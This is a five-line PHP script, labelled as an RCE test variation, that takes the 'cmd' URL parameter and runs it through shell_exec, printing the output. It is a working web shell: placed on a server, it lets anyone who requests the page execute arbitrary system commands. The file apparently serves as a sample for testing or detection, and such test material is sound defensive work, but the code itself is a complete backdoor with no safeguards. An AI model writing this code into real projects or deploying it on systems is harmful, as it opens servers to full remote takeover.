<?php
// RCE test variation #708
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>